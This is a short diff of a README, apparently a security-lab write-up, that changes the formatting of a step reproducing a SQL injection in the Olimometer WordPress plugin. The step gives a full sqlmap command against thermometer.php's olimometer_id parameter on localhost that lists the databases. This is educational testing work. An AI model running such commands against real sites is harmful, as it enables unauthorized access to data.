@@ -46,7 +46,7 @@ Time spent: **10** hours spent in total
   - [x] Steps to recreate: 
 	1. Download **Olimometer Plugin** for Word Press
 	2. Run SQL map with this command
-		```***sqlmap -u http://localhost:8080/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 --dbs --threads=5 --random-agent --no-cast***```
+		-```sqlmap -u http://localhost:8080/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 --dbs --threads=5 --random-agent --no-cast```
 	3. It should dumb two databases ```exampldb``` and ```information_schema```
 
 ## Resources
